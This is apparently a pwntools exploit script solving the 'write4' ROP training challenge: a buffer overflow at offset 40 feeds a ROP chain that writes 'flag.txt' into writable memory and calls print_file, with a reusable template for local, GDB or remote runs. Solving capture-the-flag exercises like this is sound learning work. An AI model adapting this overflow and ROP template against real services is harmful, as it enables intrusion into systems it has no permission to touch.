from pwn import *

HOST = ""
PORT = ""

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level="warn")
    p.sendlineafter(b">", payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *print_file
b *pwnme+150
continue
""".format(
    **locals()
)

# Binary filename
exe = "./write4"
# exe = "./write432"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"
context.terminal = "tmux splitw -h".split(" ")
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

MOV_EDI_RSI = 0x0000000000400629  # mov dword ptr [rsi], edi ; ret
MOV_R15_R14 = 0x0000000000400628  # mov qword ptr [r14], r15 ; ret
POP_RDI = 0x0000000000400693  # pop rdi ; ret
POP_RSI_R15 = 0x0000000000400691  # pop rsi ; pop r15 ; ret
POP_R14_POP_R15 = 0x0000000000400690  # pop r14 ; pop r15 ; ret
writable_data_section = 0x0000000000601028


# Pass in pattern_size, get back EIP/RIP offset
offset = 40

# Start program
io = start()

# Build the payload

# 64
payload = flat(
    {
        offset: [
            elf.search(asm("ret")).__next__(),
            p64(POP_R14_POP_R15),
            p64(writable_data_section),
            b"flag.txt",
            p64(MOV_R15_R14),
            p64(POP_RDI),
            p64(writable_data_section),
            elf.plt["print_file"],
        ]
    }
)

# 32
# payload = flat({offset: [elf.sym["ret2win"]]})

# Send the payload
io.sendlineafter(b"> ", payload)
io.recvuntil(b"Thank you!")

# Got Shell?
io.interactive()
